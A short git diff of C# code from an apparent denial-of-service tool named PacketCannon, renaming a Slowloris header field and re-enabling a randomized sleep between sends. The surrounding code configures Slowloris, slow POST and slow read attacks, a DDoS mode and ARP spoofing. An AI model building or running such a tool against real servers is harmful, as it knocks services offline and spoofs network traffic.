@@ -36,7 +36,7 @@ namespace PacketCannon
         public MacAddress DestinationMac { get; set; }
         public int SlowPostContentLength = 1000000;
         public string SlowLorisKeepAliveData = "X-a: b";
-        public string SlowLorisHeaderNotComplete;
+        public string SlowLorisHeader;
         public string SlowPostHeader;
         public string SlowReadUrl = @"/index.html";
         public int SlowReadWindowSize = 10;
@@ -78,7 +78,7 @@ namespace PacketCannon
             if (Ddos)
             {
                 var tester = new DosSender(SelectedDevice, SourceIpv4, DestinationIpV4, HostAddress,
-                    SlowLorisKeepAliveData, SlowLorisHeaderNotComplete, SlowPostContentLength, SlowPostHeader,
+                    SlowLorisKeepAliveData, SlowLorisHeader, SlowPostContentLength, SlowPostHeader,
                     SlowReadUrl, SourcePort, PortStep);
                 ArpSpoofAddress(DdosCount, tester);
             }
@@ -87,7 +87,7 @@ namespace PacketCannon
 
             for (int i = 0; i < SenderSize; i++)
             {
-                SlowLorisSenders.Add(new DosSender(SelectedDevice, SourceIpv4, DestinationIpV4, HostAddress, SlowLorisKeepAliveData, SlowLorisHeaderNotComplete, SlowPostContentLength, SlowPostHeader, SlowReadUrl, SourcePort, PortStep, Ddos));
+                SlowLorisSenders.Add(new DosSender(SelectedDevice, SourceIpv4, DestinationIpV4, HostAddress, SlowLorisKeepAliveData, SlowLorisHeader, SlowPostContentLength, SlowPostHeader, SlowReadUrl, SourcePort, PortStep, Ddos));
             }
             var watcher = new Thread(SearchForPackets);
             watcher.Start();
@@ -164,7 +164,7 @@ namespace PacketCannon
                             default:
                                 throw new ArgumentOutOfRangeException();
                         }
-                        //Thread.Sleep(SenderTimeOut == 0 ? new Random().Next(5, 20) : SenderTimeOut);
+                        Thread.Sleep(SenderTimeOut == 0 ? new Random().Next(5, 20) : SenderTimeOut);
                     }
                     Thread.Sleep(SenderWaveTimeOut == 0 ? new Random().Next(1000, 5000) : SenderWaveTimeOut);
                 }
